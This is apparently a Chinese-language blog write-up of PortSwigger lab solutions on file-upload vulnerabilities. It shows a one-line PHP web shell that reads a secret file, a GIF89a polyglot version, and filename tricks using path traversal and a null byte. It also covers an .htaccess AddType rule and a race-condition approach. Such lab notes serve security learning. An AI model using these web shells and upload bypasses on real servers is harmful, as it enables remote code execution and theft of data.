---
title: upload files
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-05T22:30:43+08:00
categories: 
- 渗透测试
- brup labs
---

## Remote code execution via web shell upload

可以直接上传php文件，上传位置位于头像

```
GET /files/avatars/exp.php HTTP/2
```

注意文件路径即可

## Content-Type restriction bypass

简单的上传绕过，只验证了content-type头，修改为jpeg即可绕过

## upload via path traversal

上传一个exp.php文件，

```
<?php echo file_get_contents('/home/carlos/secret');?>
```

似乎并没有组织我们上传php文件，但当我们访问该文件时，php文件直接以文本形式呈现，没有得到执行结果，这时候就要用到目录遍历

**what is directory traversal**

https://portswigger.net/web-security/file-path-traversal

利用该漏洞，我们可以将文件上传至上级目录，使服务器执行该文件

```
Content-Disposition: form-data; name="avatar"; filename="..%2fexp.php"
```

再次访问该文件即可得到回显

## blacklist bypass

根据hint,需要上传两个文件来获取flag,很自然就可以想到配置文件，由于使用的是php服务，所以选择上传.htaccess文件

上传名为exp.jpg的图片马，包含上述php代码，再通过.htaccess文件添加扩展规则

```
AddType applicatuion/x-http-php .jpg
```

访问图片文件即可

## upload via obfuscated file extension

通过混淆文件扩展名达到上传的目的，由于服务器检索我们上传的文件后缀是否问.jpg或.png

我们可以采用00截断的形式上传.php文件

```
Content-Disposition: form-data; name="avatar"; filename="exp.php%00.jpg"
```

即可

## Remote code execution via polyglot web shell upload

通过添加gif头进行绕过，服务器增加了验证文件头的方法，添加文件识别符即可

```
GIF89a
<?php echo file_get_contents('/home/carlos/secret');?>
```

## race condition

后端代码有一段如下

```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
```

可以看出来上传的文件存放到了临时文件夹里面监测病毒，再进行删除操作，因此我们可以通过竞争来率先执行php代码，在读取和上传的界面进行爆破就能读到flag
